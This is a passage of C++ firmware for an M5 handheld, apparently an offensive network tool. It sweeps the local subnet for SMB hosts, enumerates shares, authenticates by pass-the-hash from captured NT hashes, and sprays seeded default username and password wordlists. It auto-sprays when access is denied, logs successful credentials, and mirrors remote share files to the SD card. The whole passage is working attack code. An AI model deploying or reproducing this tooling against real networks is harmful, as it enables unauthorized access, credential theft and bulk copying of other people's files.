    std::vector<String> parts; { int st=0; for(int i=0;i<=args.length();i++){ if(i==args.length()||args[i]==' '){ if(i>st) parts.push_back(args.substring(st,i)); st=i+1; } } }
    if(parts.size()<2){ Serial.println(F("Usage: smb_mirror <ip> <share> [path] [maxMB]")); return; }
    IPAddress ip; if(!ip.fromString(parts[0])){ Serial.println(F("[SMB] bad ip")); return; }
    String share=parts[1]; String path=""; uint64_t maxMB=10;
    if(parts.size()>=3){
        // if the last token is a bare number, it's maxMB
        String last=parts[parts.size()-1]; bool num=last.length()>0; for(size_t i=0;i<last.length();i++) if(!isdigit((int)last[i])) num=false;
        int pathEnd=parts.size(); if(num && parts.size()>=3){ maxMB=last.toInt(); pathEnd=parts.size()-1; }
        for(int i=2;i<pathEnd;i++){ if(path.length()) path+=" "; path+=parts[i]; }
    }
    smbSerialScreenBegin("mirror "+share);
    Smb2 s; if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    Serial.printf("[SMB] mirror \\%s (max %lluMB/file) ...\n", path.c_str(), (unsigned long long)maxMB);
    String root; long kb=0, skip=0; long nf=smbMirror(s,share,path,maxMB*1024*1024,&root,&kb,&skip);
    if(nf>=0) Serial.printf("[SMB] mirror: %ld files, %ldKB, %ld skipped -> %s\n", nf, kb, skip, root.c_str());
    else      Serial.printf("[SMB] mirror FAIL (%s)\n", s.lastError.c_str());
    s.treeDisconnect(); s.close();
    Serial.println("=== smb_mirror done ===");
    smbSerialScreenEnd();
}

// hexdump the first N bytes (default 64) of an SD file: "sd_head <path> [n]"
void sdHexHead(const String& args){
    String a=args; a.trim();
    int sp=a.indexOf(' '); String path=(sp<0)?a:a.substring(0,sp);
    int n=(sp<0)?64:a.substring(sp+1).toInt(); if(n<=0) n=64; if(n>512) n=512;
    path.trim();
    File f=SD.open(path, FILE_READ);
    if(!f){ Serial.printf("[SD] open fail: %s\n", path.c_str()); return; }
    Serial.printf("[SD] %s size=%u, first %d bytes:\n", path.c_str(), (unsigned)f.size(), n);
    uint8_t b[512]; int got=f.read(b, n); f.close();
    for(int i=0;i<got;i+=16){
        Serial.printf("  %03d:", i);
        for(int j=i;j<i+16 && j<got;j++) Serial.printf(" %02x", b[j]);
        Serial.print("  ");
        for(int j=i;j<i+16 && j<got;j++){ char c=b[j]; Serial.print((c>=32&&c<127)?c:'.'); }
        Serial.println();
    }
    Serial.println("[SD] done");
}

// delete an SD file: "sd_rm <path>"
void sdRemove(const String& args){
    String p=args; p.trim();
    if(p.length()==0){ Serial.println(F("Usage: sd_rm <path>")); return; }
    if(!SD.exists(p)){ Serial.printf("[SD] not found: %s\n", p.c_str()); return; }
    Serial.printf("[SD] remove %s : %s\n", p.c_str(), SD.remove(p)?"ok":"FAIL");
}

// prompt user + password on-device, then re-authenticate the session with them.
// returns true if the server accepted the real credentials.
static bool smbPromptLogin(Smb2& s){
    smbChrome("LOGIN","","user  (DOMAIN\\user ok)","type + OK");
    M5.Display.drawRect(3,29,234,16,SMB_FRAME); M5.Display.display(); enterDebounce();
    String user=getUserInput(false,false);        // non-empty username
    smbChrome("LOGIN","","password  (empty ok)","type + OK");
    M5.Display.drawRect(3,29,234,16,SMB_FRAME); M5.Display.display(); enterDebounce();
    String pass=getUserInput(true,true);           // password may be empty
    smbMsg("Logging in",user);
    bool ok=s.authenticateUser(user,pass);
    smbMsg(ok?"Login OK":"Login failed", ok?("as "+user):s.lastError, 1600);
    return ok;
}
// create a commented NT-hash capture template the first time.
static void smbEnsureHashesTemplate(){
    smbEnsureDir();
    if(SD.exists(SMB_HASHES_FILE)) return;
    File f=SD.open(SMB_HASHES_FILE, FILE_WRITE);
    if(!f) return;
    f.println("# SMB NT-hash capture for pass-the-hash");
    f.println("# paste captured hashes here, one per line. Two formats accepted:");
    f.println("#   user:nthash                 (nthash = 32 hex)");
    f.println("#   DOMAIN\\user:rid:lm:nt:::    (pwdump / secretsdump output)");
    f.println("# '#' = comment. Example (empty-password NT hash):");
    f.println("#administrator:31d6cfe0d16ae931b73c59d7e0c089c0");
    f.close();
}
// parse one hash line -> user + 32-hex nthash. Handles "user:nthash" and the
// pwdump/secretsdump form "user:rid:lm:nt:::". Returns false for comments/bad.
static bool smbParseHashLine(const String& line, String& user, String& nthash){
    String l=line; l.trim();
    if(l.length()==0 || l[0]=='#') return false;
    std::vector<String> f; int s=0;
    for(int i=0;i<=l.length();i++){ if(i==l.length()||l[i]==':'){ f.push_back(l.substring(s,i)); s=i+1; } }
    if(f.size()>=4 && f[3].length()==32){ user=f[0]; nthash=f[3]; return true; }   // pwdump
    if(f.size()>=2 && f[1].length()==32){ user=f[0]; nthash=f[1]; return true; }   // user:nthash
    return false;
}
// pass-the-hash: load captured NT hashes from SD, pick one, authenticate.
// Never typed by hand - the hash always comes from a capture file on the card.
static bool smbPromptHashFromSD(Smb2& s){
    smbEnsureHashesTemplate();
    std::vector<String> users, hashes, labels;
    File f=SD.open(SMB_HASHES_FILE, FILE_READ);
    if(f){ while(f.available() && users.size()<200){ String ln=f.readStringUntil('\n'); String u,h;
        if(smbParseHashLine(ln,u,h)){ users.push_back(u); hashes.push_back(h);
            labels.push_back(u+"  "+h.substring(0,8)+".."); } }
        f.close(); }
    if(users.empty()){ smbMsg("No hashes on SD","put them in smb_hashes.txt",2600); return false; }
    int sel=smbSelectList(labels, "PASS THE HASH", "from SD", "smb_hashes.txt", "OK:use  DEL:cancel");
    if(sel<0) return false;
    smbMsg("Pass-the-hash", users[sel]);
    bool ok=s.authenticateHash(users[sel], hashes[sel]);
    smbMsg(ok?"PtH OK":"PtH failed", ok?("as "+users[sel]):s.lastError, 1600);
    return ok;
}

// create a commented template creds file the first time, so the user has a
// place to drop their "user:password" wordlist.
static void smbEnsureCredsTemplate(){
    smbEnsureDir();
    if(SD.exists(SMB_CREDS_FILE)) return;
    File f=SD.open(SMB_CREDS_FILE, FILE_WRITE);
    if(!f) return;
    f.println("# Auto SMB credentials wordlist");
    f.println("# one entry per line, format  user:password");
    f.println("# '#' starts a comment; 'user' alone means empty password");
    f.println("# domain accounts: DOMAIN\\user:password");
    f.println("# examples (uncomment / edit):");
    f.println("#admin:admin");
    f.println("#admin:password");
    f.println("#root:toor");
    f.close();
}

// Seed common SMB user + password wordlists to SD for the combo spray
// (users x passwords). Lists are a curated SMB-relevant subset of SecLists
// (top-usernames-shortlist + common passwords + NAS/router defaults), sized so
// users x passwords stays under SMB_SPRAY_MAXTRIES. Skips existing files unless
// force. Sets wroteU/wroteP; returns the number of combinations.
static int smbSeedWordlists(bool force, bool& wroteU, bool& wroteP){
    smbEnsureDir();
    wroteU=wroteP=false;
    static const char* users[]={
        "administrator","admin","guest","user","root","test",
        "backup","nas","qnap","pi","oracle","sa", 0 };
    static const char* pass[]={
        "password","admin","123456","12345678","123456789","admin123",
        "password1","Password1","root","toor","qwerty","letmein","welcome",
        "changeme","P@ssw0rd","nas","1234","test","guest","raspberry", 0 };
    if(force || !SD.exists(SMB_USERS_FILE)){
        File f=SD.open(SMB_USERS_FILE, FILE_WRITE);
        if(f){ f.println("# common SMB usernames (SecLists-derived) - one per line, # = comment");
               for(int i=0;users[i];i++) f.println(users[i]); f.close(); wroteU=true; }
    }
    if(force || !SD.exists(SMB_PASS_FILE)){
        File f=SD.open(SMB_PASS_FILE, FILE_WRITE);
        if(f){ f.println("# common SMB passwords (SecLists-derived) - one per line, # = comment");
               for(int i=0;pass[i];i++) f.println(pass[i]); f.close(); wroteP=true; }
    }
    int nu=0,np=0; for(int i=0;users[i];i++) nu++; for(int i=0;pass[i];i++) np++;
    return nu*np;
}
// headless: "smb_seed [force]" writes the common SMB wordlists to SD
void smbSerialSeed(const String& args){
    bool force = args.indexOf("force")>=0;
    bool u=false,p=false; int combos=smbSeedWordlists(force,u,p);
    Serial.printf("[SMB] %s : %s\n", SMB_USERS_FILE, u?"written":"kept (exists; use 'smb_seed force')");
    Serial.printf("[SMB] %s : %s\n", SMB_PASS_FILE,  p?"written":"kept (exists; use 'smb_seed force')");
    Serial.printf("[SMB] combo spray = users x passwords = %d attempts (cap %d)\n", combos, SMB_SPRAY_MAXTRIES);
}
// try one credential; handles reconnect + verbose + hit logging. Returns true on
// a real (non-guest) logon, in which case the hit is recorded.
static bool smbSprayOne(Smb2& s, const String& user, const String& pass, String* hitOut, bool verbose){
    if(!s.cli.connected()){                           // server closed socket -> reconnect
        if(verbose) Serial.println("[SPRAY] reconnecting...");
        s.close();
        if(!s.connect(s.host) || !s.negotiate()){ s.lastError="reconnect fail"; return false; }
    }
    if(verbose) Serial.printf("[SPRAY] %s:%s ... ", user.c_str(), pass.c_str());
    bool ok=s.authenticateUser(user,pass);
    if(ok){
        if(hitOut) *hitOut=user+":"+pass;
        if(verbose) Serial.println("OK");
        File hf=SD.open(SMB_HITS_FILE, FILE_APPEND);
        if(hf){ hf.printf("%s\t%s:%s\n", s.host.toString().c_str(), user.c_str(), pass.c_str()); hf.close(); }
        smbLog("HIT "+s.host.toString()+" "+user+":"+pass);
    } else if(verbose) Serial.printf("no (%s)\n", s.lastError.c_str());
    return ok;
}
// spray credentials against the session with NTLMv2. If both smb_users.txt and
// smb_pass.txt exist, sprays users x passwords (streamed, memory-safe); otherwise
// uses smb_creds.txt "user:password" pairs ('#'/blank skipped, no ':' = empty pass).
// Stops at the first real (non-guest) logon, on backspace, or at the lockout cap.
// count non-comment lines in an SD file (for the spray progress total)
static int smbCountLines(const char* path){
    int n=0; File f=SD.open(path, FILE_READ);
    if(f){ while(f.available()){ String l=f.readStringUntil('\n'); l.trim(); if(l.length() && l[0]!='#') n++; } f.close(); }
    return n;
}
static bool smbTryCredsFile(Smb2& s, int* triedOut, String* hitOut, bool verbose, bool showUI=false){
    if(triedOut) *triedOut=0;
    int tried=0; bool ok=false;
    bool combo = SD.exists(SMB_USERS_FILE) && SD.exists(SMB_PASS_FILE);
    int total = combo ? (smbCountLines(SMB_USERS_FILE)*smbCountLines(SMB_PASS_FILE)) : smbCountLines(SMB_CREDS_FILE);
    if(total>SMB_SPRAY_MAXTRIES) total=SMB_SPRAY_MAXTRIES;
    if(showUI) smbChrome("SPRAY", smbBadge(s), s.host.toString(), "DEL:abort");
    // draw the current attempt (number / total + the cred being tried + a bar)
    auto drawSpray=[&](const String& cred){
        if(!showUI) return;
        M5.Display.fillRect(2,40,234,66,SMB_BG);
        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
        char t[24]; snprintf(t,sizeof t,"try %d / %d", tried, total);
        M5.Display.setCursor((240-M5.Display.textWidth(t))/2,46); M5.Display.print(t);
        String c=smbClip(cred,24); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
        M5.Display.setCursor((240-M5.Display.textWidth(c))/2,66); M5.Display.print(c);
        smbBar(20,88,200,9,tried,total); M5.Display.display();
    };
    if(combo){
        if(verbose) Serial.println("[SPRAY] combo mode: smb_users.txt x smb_pass.txt");
        File uf=SD.open(SMB_USERS_FILE, FILE_READ);
        if(!uf){ s.lastError="no users file"; return false; }
        while(uf.available() && !ok){
            String user=uf.readStringUntil('\n'); user.trim();
            if(user.length()==0 || user[0]=='#') continue;
            File pf=SD.open(SMB_PASS_FILE, FILE_READ);
            if(!pf) break;
            while(pf.available()){
                String pass=pf.readStringUntil('\n'); pass.trim();
                if(pass.length()==0 || pass[0]=='#') continue;
                if(tried>=SMB_SPRAY_MAXTRIES){ if(verbose) Serial.println("[SPRAY] lockout cap reached"); break; }
                tried++; drawSpray(user+":"+pass);
                if(smbSprayOne(s,user,pass,hitOut,verbose)){ ok=true; break; }
                M5.update(); cardUpdate(); delay(5);
                if(kp(KEY_BACKSPACE)){ pf.close(); uf.close(); if(triedOut)*triedOut=tried; return false; }
            }
            pf.close();
            if(tried>=SMB_SPRAY_MAXTRIES) break;
        }
        uf.close();
    } else {
        File f=SD.open(SMB_CREDS_FILE, FILE_READ);
        if(!f){ s.lastError="no creds file"; return false; }
        while(f.available()){
            String line=f.readStringUntil('\n'); line.trim();
            if(line.length()==0 || line[0]=='#') continue;
            int c=line.indexOf(':');
            String user = (c<0)? line : line.substring(0,c);
            String pass = (c<0)? ""   : line.substring(c+1);
            user.trim();
            if(user.length()==0) continue;
            if(tried>=SMB_SPRAY_MAXTRIES){ if(verbose) Serial.println("[SPRAY] lockout cap reached"); break; }
            tried++; drawSpray(user+":"+pass);
            if(smbSprayOne(s,user,pass,hitOut,verbose)){ ok=true; break; }
            M5.update(); cardUpdate(); delay(5);
            if(kp(KEY_BACKSPACE)) break;
        }
        f.close();
    }
    if(triedOut) *triedOut=tried;
    return ok;
}

// headless creds spray over serial: "smb_spray <ip> [share]" (verbose per attempt)
void smbSerialSpray(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    String a=args; a.trim();
    int sp=a.indexOf(' '); String ipS=(sp<0)?a:a.substring(0,sp);
    String share=(sp<0)?"":a.substring(sp+1); share.trim(); ipS.trim();
    IPAddress ip; if(!ip.fromString(ipS)){ Serial.println(F("Usage: smb_spray <ip> [share]")); return; }
    smbSerialScreenBegin("spray "+ip.toString());
    Smb2 s;
    Serial.printf("[SMB] connect %s:445 ... ", ip.toString().c_str());
    if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    if(!s.negotiate()){ Serial.printf("[SMB] negotiate FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    smbEnsureCredsTemplate();
    Serial.printf("[SMB] spraying %s ...\n", SMB_CREDS_FILE);
    int tried=0; String hit;
    bool ok=smbTryCredsFile(s,&tried,&hit,true,true);
    if(ok){
        Serial.printf("[SMB] SUCCESS %s (%d tried)\n", hit.c_str(), tried);
        if(share.length()){
            Serial.printf("[SMB] tree connect %s ... ", share.c_str());
            if(s.treeConnect(share)){
                Serial.println("ok");
                std::vector<SmbEntry> e;
                if(s.listDir("",e)){ Serial.printf("[SMB] %s\\ : %d entr(y/ies)\n", share.c_str(), (int)e.size());
                    for(auto& en:e) Serial.printf("[SMB]   %s %-28s %llu\n", en.isDir?"<DIR>":"     ", en.name.c_str(), (unsigned long long)en.size); }
                s.treeDisconnect();
            } else Serial.printf("FAIL (%s)\n", s.lastError.c_str());
        }
    } else if(tried==0) Serial.printf("[SMB] no usable entries in %s\n", SMB_CREDS_FILE);
    else Serial.printf("[SMB] no valid credential (%d tried)\n", tried);
    s.close();
    Serial.println("=== smb_spray done ===");
    smbSerialScreenEnd();
}

// one-line boxed text prompt reusing the keyboard input helper; empty = cancel.
// getUserInput draws at (5,30), so the field sits just under the header.
static String smbPromptText(const String& title, const String& label){
    smbChrome(title,"",label,"type + OK   empty=cancel");
    M5.Display.drawRect(3,29,234,16,SMB_FRAME);          // input box (getUserInput writes at 5,30)
    M5.Display.display(); enterDebounce();
    return getUserInput(false,true);
}

void smbDiscoverMenu(){
    inMenu=false;                                   // own the screen; waitAndReturnToMenu restores
    if(WiFi.status()!=WL_CONNECTED || WiFi.localIP().toString()=="0.0.0.0"){
        waitAndReturnToMenu("Not connected to WiFi"); return;
    }
    // ---- discovery: ARP blast the /24, then TCP-probe 445 only on responders ----
    //  Old path TCP-connected to every one of the 254 hosts (long timeout each).
    //  New path: (1) one ARP blast of the /24 -> the handful of live hosts, then
    //  (2) short-timeout 445 probe on just those. Seconds instead of a minute.
    IPAddress net=WiFi.localIP(); net[3]=0;
    smbChrome("SMB EXPLORER","arp", net.toString()+"/24", "DEL:skip scan");
    std::vector<IPAddress> smbHosts;
    uint32_t lastDraw=0;

    auto drawScan=[&](const char* phase,long cur,long total){
        M5.Display.fillRect(2,52,234,40,SMB_BG);
        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
        char line[32]; snprintf(line,sizeof line,"%s %ld / %ld",phase,cur,total);
        M5.Display.setCursor((240-M5.Display.textWidth(line))/2,54); M5.Display.print(line);
        smbBar(20,70,200,9,cur,total);
        M5.Display.setTextColor(SMB_TITLE,SMB_BG); char h[20]; snprintf(h,sizeof h,"hosts: %d",(int)smbHosts.size());
        M5.Display.setCursor((240-M5.Display.textWidth(h))/2,84); M5.Display.print(h);
        M5.Display.display(); lastDraw=millis();
    };

    // Phase 1: UDP-trigger ARP across the whole /24, read back the live hosts
    std::vector<IPAddress> live;
    smbArpSweep(net, live, [&](int cur,int total){ drawScan("arp sweep",cur,total); });

    // Phase 2: TCP-probe 445 only on the ARP responders (short timeout)
    for(size_t k=0;k<live.size();k++){
        if(kp(KEY_BACKSPACE)) break;
        if(millis()-lastDraw>100) drawScan("check 445",(long)(k+1),(long)live.size());
        WiFiClient c;
        if(c.connect(live[k],445,400)){ smbHosts.push_back(live[k]); c.stop(); }   // 400ms cap
    }

    // import extra hosts from SD (/evil/smb/hosts.txt, one IP per line)
    if(SD.exists(SMB_HOSTS_FILE)){
        File hf=SD.open(SMB_HOSTS_FILE, FILE_READ);
        if(hf){ while(hf.available()){ String l=hf.readStringUntil('\n'); l.trim();
            if(l.length()==0||l[0]=='#') continue; IPAddress ip;
            if(ip.fromString(l)){ bool have=false; for(auto&h:smbHosts) if(h==ip) have=true; if(!have) smbHosts.push_back(ip); } }
            hf.close(); }
    }
    smbLog("DISCOVER "+net.toString()+"/24 -> "+String((int)smbHosts.size())+" host(s) with 445");
    // recon: grab each SMB host's computer name (one quick NTLM round each)
    std::vector<String> hostNames(smbHosts.size());
    for(size_t i=0;i<smbHosts.size();i++){ drawScan("identify",(long)i+1,(long)smbHosts.size()); hostNames[i]=smbIdentify(smbHosts[i]); }

    while(true){
        std::vector<String> hl;
        for(size_t i=0;i<smbHosts.size();i++) hl.push_back(smbHosts[i].toString()+(hostNames[i].length()?("  "+hostNames[i]):""));
        hl.push_back("<enter IP>");
        int hi=smbSelectList(hl, "HOSTS", String((int)smbHosts.size())+" up",
                             net.toString()+"/24", "OK:connect  DEL:back");
        if(hi<0){ waitAndReturnToMenu("Back to menu"); return; }
        IPAddress target;
        if(hi==(int)smbHosts.size()){                 // manual IP entry
            String ips=smbPromptText("ENTER IP","IP address:"); ips.trim();
            if(ips.length()==0) continue;             // cancelled
            if(!target.fromString(ips)){ smbMsg("Bad IP",ips,1200); continue; }
            bool have=false; for(auto&h:smbHosts) if(h==target) have=true;
            if(!have) smbHosts.push_back(target);
        } else target=smbHosts[hi];
        Smb2 s;
        smbMsg("Connecting",target.toString());
        if(!s.connect(target)){ smbMsg("TCP failed",s.lastError,1500); continue; }
        if(!s.negotiate()){ smbMsg("Negotiate failed",s.lastError,1500); s.close(); continue; }
        if(!s.authenticate()){ smbMsg("Auth refused","anon+guest denied",2000); smbLog("AUTH "+target.toString()+" refused (anon+guest)"); s.close(); continue; }
        smbLog("AUTH "+target.toString()+" ok ("+(s.authMode_guest?"guest":"anon")+") dialect="+String(s.dialect,HEX));
        smbMsg(s.authMode_guest?"Guest OK":"Anonymous OK","enumerating shares...",600);
        std::vector<String> shares;
        if(!smbEnumShares(s,shares)||shares.empty()){ smbMsg("No shares listed",s.lastError,1800); s.close(); continue; }
        smbLog("SHARES "+target.toString()+" -> "+String((int)shares.size()));
        // probe which shares the current identity can open (for the LOCK tags)
        std::vector<uint8_t> shareLock(shares.size(),0);
        auto probeShares=[&](){
            for(size_t i=0;i<shares.size();i++){
                M5.Display.fillRect(2,52,234,30,SMB_BG);
                M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
                M5.Display.setCursor(8,58); M5.Display.printf("checking access %u/%u",(unsigned)(i+1),(unsigned)shares.size());
                M5.Display.display();
                if(shares[i].endsWith("$")){ shareLock[i]=1; continue; }
                shareLock[i] = s.treeConnect(shares[i]) ? 0 : 1;
                if(!shareLock[i]) s.treeDisconnect();
            }
        };
        smbChrome("SHARES", smbBadge(s), target.toString(), "please wait");
        probeShares();
        String dname = s.targetName.length()? s.targetName : target.toString();
        String dsub = dname+"  SMB"+smbDialectStr(s.dialect)+(s.signingRequired?" sign":"");
        while(true){
            std::vector<String> sl=shares;
            std::vector<uint8_t> fl=shareLock;        // flags parallel to sl (actions unflagged)
            int iInfo=shares.size();  sl.push_back("<host info>");      fl.push_back(0);
            int iLogin=sl.size();     sl.push_back("<login user/pass>"); fl.push_back(0);
            int iPth=sl.size();       sl.push_back("<pass the hash>");   fl.push_back(0);
            int iSpray=sl.size();     sl.push_back("<creds spray>");     fl.push_back(0);
            int iReport=sl.size();    sl.push_back("<report+matrix>");   fl.push_back(0);
            int iRescan=sl.size();    sl.push_back("<rescan hosts>");    fl.push_back(0);
            int si=smbSelectList(sl, "SHARES", smbBadge(s), dsub, "OK:open  DEL:back", &fl);
            if(si<0) break;
            if(si==iInfo){ smbHostInfo(s); continue; }
            if(si==iLogin){ if(smbPromptLogin(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
            if(si==iPth){ if(smbPromptHashFromSD(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
            if(si==iReport){
                smbChrome("REPORT", smbBadge(s), dname, "writing matrix...");
                String rp=smbWriteReport(s,shares,[&](int c,int t){
                    M5.Display.fillRect(2,52,234,20,SMB_BG); M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
                    M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,58);
                    M5.Display.printf("share %d / %d",c,t); M5.Display.display(); });
                if(rp.length()) smbMsg("Report saved", rp, 2800);
                else            smbMsg("Report failed", s.lastError, 2000);
                continue;
            }
            if(si==iSpray){                                              // spray SD creds wordlist
                smbEnsureCredsTemplate();
                int tried=0; String hit;
                bool ok=smbTryCredsFile(s,&tried,&hit,false,true);
                if(ok){ smbMsg("Login OK", hit+"  ("+String(tried)+" tried)", 2500);
                        smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); }
                else if(tried==0) smbMsg("Creds file empty", "edit smb_creds.txt", 2500);
                else              smbMsg("No valid cred", String(tried)+" tried", 2200);
                continue;
            }
            if(si==iRescan) break;                                       // rescan hosts
            if(!s.treeConnect(shares[si])){
                if(s.lastStatus==0xC0000022){                            // ACCESS_DENIED
                    smbLog("DENIED "+target.toString()+" "+shares[si]);
                    smbMsg("Access denied", shares[si]+" needs login", 1200);
                    // auto-spray the wordlist, then offer manual login
                    smbEnsureCredsTemplate();
                    int tried=0; String hit;
                    if(smbTryCredsFile(s,&tried,&hit,false,true))
                        smbMsg("Login OK", hit, 1500);
                    else if(tried>0)
                        smbMsg("Spray: no valid cred", String(tried)+" tried", 1500);
                    if(s.treeConnect(shares[si])){ smbBrowse(s,shares[si]); s.treeDisconnect(); }
                    else if(smbPromptLogin(s)){
                        if(s.treeConnect(shares[si])){ smbBrowse(s,shares[si]); s.treeDisconnect(); }
                        else smbMsg("Tree connect failed", s.lastError, 1600);
                    }
                    continue;
                }
                smbMsg("Tree connect failed", s.lastError, 1500); continue;
            }
            smbLog("BROWSE "+target.toString()+" "+shares[si]);
            smbBrowse(s,shares[si]);
            s.treeDisconnect();
        }
        s.close();
    }
}
